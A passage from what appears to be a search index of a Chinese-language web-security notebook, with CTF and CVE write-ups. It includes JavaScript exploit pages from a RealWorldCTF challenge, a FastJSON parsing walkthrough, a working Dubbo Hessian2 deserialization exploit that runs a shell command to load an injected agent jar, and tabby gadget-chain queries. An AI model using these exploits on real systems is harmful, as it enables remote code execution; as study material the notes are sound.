500);\n}\nmain();\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>c.html</p> <pre><code>&lt;script&gt;\nb = open(`/d.html`);\nlocation.replace(\"http://localhost:12345/\");\n&lt;/script&gt;\n</code></pre> <p>d.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nconst main = async () =&gt; {\nawait sleep(1000);\n// 32 is the start of the href url that contains id\n// 36 is the len of the id\nfor (var i = 32; i &lt;= 32+36+1; i++) {\n// I'm explainig this payload below\nPAYLOAD = `opener.opener[opener.opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;\n// change c.html page's location to the vulnerable page that executes callback\nopener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);\n// check the next character every 1.5 secs so that the page have 1.5 sec to load.\nawait sleep(1500);\n}\n}\nmain();\n&lt;/script&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#_1","title":"\u53c2\u8003","text":"<p>https://sh1yo.art/ctf/thecultof8bit/</p> <p>Sndav</p> <p>https://www.someattack.com/</p> <p>https://h4cking2thegate.github.io/2023/01/10/RWCTF2023-the-cult-of-8bit/</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/FastJSON/","title":"FastJSON","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/FastJSON/#_1","title":"\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b","text":"<pre><code>package learn;\nimport com.alibaba.fastjson.JSON;\npublic class Student {\nprivate String name;\npublic Student(String name) {\nthis.name = name;\n}\npublic String getName() {\nreturn name;\n}\npublic void setName(String name) {\nthis.name = name;\n}\npublic static void main(String[] args) {\nString jsonString=\"{\\n\" +\n\"  \\\"name\\\": \\\"bridge\\\"\\n\" +\n\"}\";\nStudent student=JSON.parseObject(jsonString,Student.class);\nSystem.out.println(student.getName());\n}\n}\n</code></pre> <pre><code>{\n\"name\": \"bridge\"\n}\n</code></pre> <p>JSON#parseObject</p> <p>\u521d\u59cb\u5316ParserConfig config\uff0c\u628a\u9ed1\u767d\u540d\u5355\u4e4b\u7c7b\u7684\u52a0\u8f7d\u8fdb\u53bb</p> <p>\u7136\u540e\u521d\u59cb\u5316DefaultJSONParser </p> <p>DefaultJSONParser parser = new DefaultJSONParser(input, config, featureValues);</p> <p>\u7136\u540e<code>T value = (T) parser.parseObject(clazz, null);</code></p> <p>DefaultJSONParser.parseObject</p> <p>\u53bb\u83b7\u53d6deserializer</p> <p><code>ObjectDeserializer deserializer = config.getDeserializer(type);</code></p> <p>\u5982\u679c\u662f\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7c7b\uff0c\u5c31\u4f1a\u7528asm\u52a8\u6001\u751f\u6210\u4e00\u4e2aJavaBeanDeserializer</p> <p><code>return (T) deserializer.deserialze(this, type, fieldName);</code></p> <p>JavaBeanDeserializer.deserialze</p> <p>\u5faa\u73af\u8bfb\u53d6field\uff0c\u751f\u6210<code>sortedFieldDeserializers</code>\uff0c\u6b64\u65f6\u7684field\u53ef\u80fd\u662f<code>$ref</code>\u4e4b\u7c7b\u7684\u4e1c\u897f</p> <p>\u6bcf\u4e2afield\u90fd\u4f1a\u53bb\u8c03\u7528<code>parseField\u65b9\u6cd5</code></p> <p>\u7136\u540e\u751f\u6210\u597dfieldDeserializer\u540e\u8c03\u7528</p> <p><code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p> <p>DefaultFieldDeserializer.parseField</p> <p>\u5148\u83b7\u53d6fieldValueDeserilizer</p> <p>\u7136\u540e\u8c03\u7528</p> <p><code>value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);</code></p> <p>\u6700\u540e\u7ec8\u4e8e <code>StringCodec#deserialze</code>\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86dfs\u9012\u5f52</p> <p>\u53e6\u5916\u5728DefaultJSONParser.parseObject\u4e2d\u68c0\u6d4b\u5230key\u662f@type,\u4f1a<code>config.checkAutoType</code>\u68c0\u67e5\u540d\u5355</p> <p>\u5f85\u586b\u5751...</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/","title":"Java Serialization Chains","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#commons-collections","title":"Commons-Collections","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#dubbohessian","title":"dubbo&amp;hessian","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2022-39198","title":"CVE-2022-39198","text":"<p>\u66f4\u65b0\u540e\u52a0\u4e86\u9ed1\u540d\u5355\uff0c\u9ed8\u8ba4\u4e0d\u80fd\u53cd\u5e8f\u5217\u5316\u4e0d\u7ee7\u627fserializable\u7684\u7c7b</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#source-tostring","title":"source: toString","text":"<p>\u76ee\u524d\u5168\u7248\u672c(2.7.20)</p> <p>https://paper.seebug.org/1266/</p> <p>\u4f1a\u53d1\u73b0\u5b9e\u9645\u4e0a\u5148readObject\u518dtoString\uff0csource\u5176\u5b9e\u662ftoString\uff0c\u4f46\u662f\u4f1a\u5148\u88abreadObject</p> <p>https://mp.weixin.qq.com/s/kGcOY8xLCu9LDL6LoWm1Bw</p> <p>POC:</p> <pre><code>import com.alibaba.fastjson.JSONObject;\nimport org.apache.dubbo.common.io.Bytes;\nimport org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;\nimport sun.misc.Unsafe;\nimport sun.print.UnixPrintServiceLookup;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Random;\nimport static org.apache.dubbo.common.utils.FieldUtils.setFieldValue;\npublic class Exploit3 {\npublic static void main(String[] args) throws Exception{\nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\nbyte[] header = new byte[16];\nBytes.short2bytes((short) 0xdabb, header);\nheader[2] = (byte) ((byte) 0x80 | 2);\nBytes.long2bytes(new Random().nextInt(100000000), header, 4);\nByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();\nHessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);\n/////////############################################\nField theUnsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\ntheUnsafe.setAccessible(true);\nUnsafe unsafe = (Unsafe) theUnsafe.get(null);\nObject unix = unsafe.allocateInstance(UnixPrintServiceLookup.class);\nsetFieldValue(unix, \"osname\",\"hack\");\n// ...\nString cmds = \"python3 -c \\\"import os;os.system('/dubbo/java/jdk1.8.0_202/bin/java -Dfile.encoding=UTF-8 -classpath /dubbo/java/jdk1.8.0_202/lib/tools.jar:/tmp/inject.jar hack.TestAgentMain')\\\"\";\nsetFieldValue(unix, \"lpcFirstCom\",new String[]{cmds,cmds,cmds});\nJSONObject jo = new JSONObject();\njo.put(\"oops\",unix);\n/////////############################################\nout.writeUTF(\"xxxxx\");\nout.writeUTF(\"org.apache.dubbo.registry.RegistryService\");\n//        out.writeUTF(\"org.apache.dubbo.metadata.MetadataService\");\n//        out.writeUTF(\"DemoService\");\nout.writeUTF(\"0.0.0\");\nout.writeUTF(\"$echo\");\nout.writeUTF(\"Ljava/lang/Object;\");\nout.writeObject(jo);\nHashMap hkhash = new HashMap();\nhkhash.put(\"aaa\",\"bbb\");\nout.writeObject(hkhash);\nout.flushBuffer();\nBytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);\nbyteArrayOutputStream.write(header);\nbyteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());\nbyte[] bytes = byteArrayOutputStream.toByteArray();\nSocket socket = new Socket(\"127.0.0.1\", 20880);\nOutputStream outputStream = socket.getOutputStream();\noutputStream.write(bytes);\noutputStream.flush();\noutputStream.close();\n}\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#tostring2getter","title":"toString2getter","text":"<p>rome1.0: ToStringBean</p> <p>fastjson: com.alibaba.fastjson.JSON#toString()</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#getter2rce","title":"getter2RCE","text":"<p>UnixPrintServiceLookup</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#hessian-jdk-only","title":"hessian jdk only","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2021-43297-readobject2tostring","title":"CVE-2021-43297: readObject2toString","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2021-21346-tostring2rce","title":"CVE-2021-21346: toString2RCE","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/MemoryShell/","title":"MemoryShell","text":"<p>\u5f85\u586b\u5751</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/","title":"tabby","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#path","title":"\u4e00\u6761path","text":"<pre><code>match path=(source:Method)-[:CALL*..1]-&gt;(sink:Method {}) where source.PARAMETER_SIZE=0  and source.NAME =~ \"get.*\" and sink.NAME =~ \"exec.*\" return path limit 5\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#paths","title":"\u5b8c\u6574\u7684paths","text":"<p><pre><code>match (source:Method)\nmatch (sink:Method {NAME:\"exec\"})&lt;-[:CALL]-(m1:Method)\nwhere source.NAME=\"getDefaultPrinterNameBSD\" and source.HAS_PARAMETERS=false and sink.CLASSNAME=\"java.lang.Runtime\"\ncall apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path return * limit 5\n</code></pre> <pre><code>match (source:Method {NAME:\"readObject\",CLASSNAME:\"java.util.HashMap\"})\nmatch (sink:Method {NAME:\"toString\"})\nwith source, collect(sink) as sinks\ncall tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in [\"javax.management.BadAttributeValueExpException\",\"com.sun.jmx.snmp.SnmpEngineId\",\"com.sun.xml.internal.ws.api.BindingID\",\"javax.swing.text.html.HTML$UnknownTag\"])\nreturn path limit 1\n</code></pre></p> <pre><code>match (source:Method) where source.NAME in [\"equals\",\"hashCode\",\"compareTo\"] with collect(source) as sources\nmatch (sink:Method {IS_SINK:true}) where sink.NAME =~ \"invoke\" and sink.VUL =~ \"CODE\" and sink.CLASSNAME =~ \"java.lang.reflect.Method\"\nwith sources, collect(sink) as sinks\ncall tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path where none(n in nodes(path) where (n.CLASSNAME =~ \"java.util.Iterator\" or n.CLASSNAME =~ \"java.util.Enumeration\" or n.CLASSNAME =~ \"java.util.Map\" or n.CLASSNAME =~ \"java.util.List\" or n.CLASSNAME=~\"jdk.nashorn.internal.ir.UnaryNode\" or n.CLASSNAME=~\"com.sun.jndi.ldap.ClientId\" or n.CLASSNAME=~\"org.apache.catalina.webresources.TrackedInputStream\"))\nreturn path limit 1\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#constructor-cve-2022-44262","title":"\u9650\u5236constructor: CVE-2022-44262","text":"<pre><code>match (constructor:Method{NAME:\"&lt;init&gt;\",IS_PUBLIC:true})\nmatch (clazz:Class)\nmatch (sink:Method {IS_SINK:true})&lt;-[:CALL]-(m1:Method)\nwhere (clazz)-[:HAS]-&gt;(constructor) and constructor.PARAMETER_SIZE=2 and constructor.SUB_SIGNATURE=\"void &lt;init&gt;(java.lang.String,java.lang.String)\"\ncall apoc.algo.allSimplePaths(sink,constructor, \"&lt;CALL|ALIAS\", 5) yield path\nreturn path\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2022-44262%20ff4j%E7%89%B9%E6%AE%8A%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%8C%96/","title":"CVE-2022-44262 ff4j\u7279\u6b8a\u7c7b\u5b9e\u4f8b\u5316","text":"<p>SSRF POC</p> <p>https://github.com/ff4j/ff4j/issues/624</p> <p>\u5bb9\u6613\u5b9a\u4f4d\u5230PropertiesParser#parseProperties</p> <pre><code>...\nConstructor&lt;?&gt; constr = Class.forName(optionalType).getConstructor(String.class, String.class);\nap = (Property&lt;?&gt;) constr.newInstance(name, strValue);\n...\n</code></pre> <p>\u5176\u4e2doptionalType\uff0cname\uff0cstrValue\u90fd\u662f\u53ef\u63a7\u7684\u3002</p> <p>\u4e0a\u9762POC\u7528\u7684<code>ResourcePropertySource</code>\u8fd9\u4e2a\u7c7b\u53ef\u4ee5SSRF\uff0c\u4f46\u662f\u60c5\u62a5\u8bf4\u53ef\u4ee5\u5bfc\u81f4RCE\uff0c\u7528tabby\u641c\u4e86\u4e00\u4e0b\uff0c\u4f46\u662f\u53ef\u60dc\u6ca1\u627e\u5230ww</p> <pre><code>match (constructor:Method{NAME:\"&lt;init&gt;\",IS_PUBLIC:true})\nmatch (clazz:Class)\nmatch (sink:Method {IS_SINK:true})&lt;-[:CALL]-(m1:Method)\nwhere (clazz)-[:HAS]-&gt;(constructor) and constructor.PARAMETER_SIZE=2 and constructor.SUB_SIGNATURE=\"void &lt;init&gt;(java.lang.String,java.lang.String)\"\ncall apoc.algo.allSimplePaths(sink,constructor, \"&lt;CALL|ALIAS\", 5) yield path\nreturn path\n</code></pre> <p>\u52c9\u5f3a\u627e\u5230\u4e86<code>java.io.PrintStream</code>\u8fd9\u4e2a\u7c7b\uff0c\u6784\u9020\u5668\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u7a7a\u6587\u4ef6\u521b\u5efa\uff0c\u8986\u76d6\u539f\u6709\u6587\u4ef6\u3002</p>"}]}